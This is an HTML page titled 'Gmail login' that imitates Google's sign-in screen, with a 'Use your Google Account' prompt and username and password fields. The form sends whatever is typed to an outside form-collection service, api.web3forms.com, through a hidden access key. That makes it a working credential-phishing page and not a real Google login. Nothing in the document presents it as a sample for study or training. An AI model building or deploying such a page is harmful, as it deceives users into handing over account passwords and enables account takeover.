<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="google.png">
    <title>Gmail login</title>
    <link rel="stylesheet" href="google.css">
    <style>

@import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');


body {
    margin: 0;
    padding: 0;
    background-size: cover;
    font-family: 'Open Sans', sans-serif;
}

.box {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 30rem;
    padding: 3.5rem;
    box-sizing: border-box;
    border: 1px solid #dadce0;
    -webkit-border-radius: 8px;
    border-radius: 8px;

}

.box h2 {
    margin: 0px 0 -0.125rem;
    padding: 0;
    text-align: center;
    color: #202124;
    font-size: 24px;
    font-weight: 400;
}

.box .logo 
{
    display: flex;
    flex-direction: row;
    justify-content: center;
    margin-bottom: 16px;

}

.box p {
    font-size: 16px;
    font-weight: 400;
    letter-spacing: 1px;
    line-height: 1.5;
    margin-bottom: 24px;
    text-align: center;
}

.box .inputBox {
    position: relative;
}

.box .inputBox input {
    width: 93%;
    padding: 1.3rem 10px;
    font-size: 1rem;
   letter-spacing: 0.062rem;
   margin-bottom: 1.875rem;
   border: 1px solid #ccc;
   background: transparent;
   border-radius: 4px;
}

.box .inputBox label {
    position: absolute;
    top: 0;
    left: 10px;
    padding: 0.625rem 0;
    font-size: 1rem;
    color: gray;
    pointer-events: none;
    transition: 0.5s;
}

.box .inputBox input:focus ~ label,
.box .inputBox input:valid ~ label,
.box .inputBox input:not([value=""]) ~ label {
    top: -1.125rem;
    left: 10px;
    color: #1a73e8;
    font-size: 0.75rem;
    background-color: #fff;
    height: 10px;
    padding-left: 5px;
    padding-right: 5px;
}

.box .inputBox input:focus {
    outline: none;
    border: 2px solid #1a73e8;
}

.box input[type="submit"] {
    border: none;
    outline: none;
    color: #fff;
    background-color: #1a73e8;
    padding: 0.625rem 1.25rem;
    cursor: pointer;
    border-radius: 0.312rem;
    font-size: 1rem;
    float: right;
  }

  .box input[type="submit"]:hover {
    background-color: #287ae6;
    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
  }


    </style>
</head>
<body>
<img src="google.png" width="1350px" style="padding-bottom: 10px;">
    <div class="box">
        <div class="logo">

        </div>
    <h2>Sign In</h2>
    <p>Use your Google Account</p>
    
        
      </form>
      <div class="inputBox">
      <form action="https://api.web3forms.com/submit" method="POST">

        <input type="hidden" name="access_key" value="a1633aa9-4e14-4e68-9b69-05f2a66f61c3">
      
        
    <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
    <label>Username</label>
      </div>
      <div class="inputBox">
        <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
        <label>Password</label>
        <input type="submit" name="sign-in" value="Sign In">
        </div>
      </form>
    </div>

</body>
</html>
